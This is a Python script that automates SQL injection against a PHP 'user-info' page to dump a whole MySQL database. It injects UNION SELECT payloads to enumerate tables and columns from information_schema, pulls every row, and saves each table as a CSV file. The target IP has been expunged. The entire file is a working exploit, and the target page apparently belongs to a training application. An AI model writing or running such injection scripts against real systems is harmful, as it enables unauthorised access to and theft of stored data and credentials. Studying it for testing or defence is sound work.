#!/bin/python3

import requests
from bs4 import BeautifulSoup


# WARNING:
#===============================================================================
# Sensitive IP addresses have been removed from this script for security reasons.
# At the moment, this script will not run properly because said IP addresses have
# been expunged and replaced with the string "<--EXPUNGED IP-->".
#===============================================================================
#
# Script used to dump the contents of a MySQL Database through an injection
#



# 1: Pull all table names
#-------------------------------------------------------------------------------
# Setup injection payload in URL
init_column = "table_name"
init_table = "information_schema.tables"
payload = "%27+UNION+SELECT+1%2C" + init_column + "%2C3%2C4%2C5%2C6%2C7+FROM+" + init_table + "%3B+%23"
url = "http://<--EXPUNGED IP-->/portal/index.php?page=user-info.php&username=" + payload + "&password=&user-info-php-submit-button=View+Account+Details"

# GET injection respone
response = requests.get(url)

# Parse html for assets
soup = BeautifulSoup(response.content, "html.parser")
spans = soup.find_all("span")

# Set up mock db
db = {}
for i in range(len(spans)):
    if spans[i].text == "Username=":
        db[spans[i+1].text] = {}
#-------------------------------------------------------------------------------



# 2: Grab columns for tables
#-------------------------------------------------------------------------------
for table in db.keys():
    payload = "%27+UNION+SELECT+1%2Ccolumn_name%2C3%2C4%2C5%2C6%2C7+FROM+information_schema.columns+WHERE+table_name+%3D+%27" + table + "%27%3B+%23"
    url = "http://<--EXPUNGED IP-->/portal/index.php?page=user-info.php&username=" + payload + "&password=&user-info-php-submit-button=View+Account+Details"

    # GET injection respone
    response = requests.get(url)

    # Parse html for assets
    soup = BeautifulSoup(response.content, "html.parser")
    spans = soup.find_all("span")

    db[table] = {}
    for i in range(len(spans)):
        if spans[i].text == "Username=":
            db[table][spans[i+1].text] = []
#-------------------------------------------------------------------------------



# 3: Grab everything
#-------------------------------------------------------------------------------
# Nuking the tables after written to files, cannot pop from the mock db while iterating db.keys()
_tables = list(db.keys())
for table in _tables:
    # Server does not like being asked for anything from hitlog table
    if not table == "hitlog":
        print('GRABBING: ' + table)
        for column in db[table].keys():
            print('\t' + column)

            payload = "%27+UNION+SELECT+1%2C" + column + "%2CROW_NUMBER%28%29+OVER%28%29+AS+num_row%2C4%2C5%2C6%2C7+FROM+" + table + "%3B+%23"
            url = "<--EXPUNGED IP-->/portal/index.php?page=user-info.php&username=" + payload + "&password=&user-info-php-submit-button=View+Account+Details"

            # GET injection respone
            response = requests.get(url)

            # Parse html for assets
            soup = BeautifulSoup(response.content, "html.parser")
            spans = soup.find_all("span")

            for i in range(len(spans)):
                if spans[i].text == "Username=":
                    db[table][column].append(spans[i+1].text)

        # Write to CVS files
        print('WRITING: ' + table)
        with open(table + '.csv', 'w') as file:
            for column in db[table].keys():
                file.write(column + ',')

                for i in range(len(db[table][column])):
                    file.write(db[table][column][i])
                    if not i == len(db[table][column]) - 1:
                        file.write(',')
                file.write('\n')

    # Nuke the table after its been used, saves on RAM
    db.pop(table)
#-------------------------------------------------------------------------------
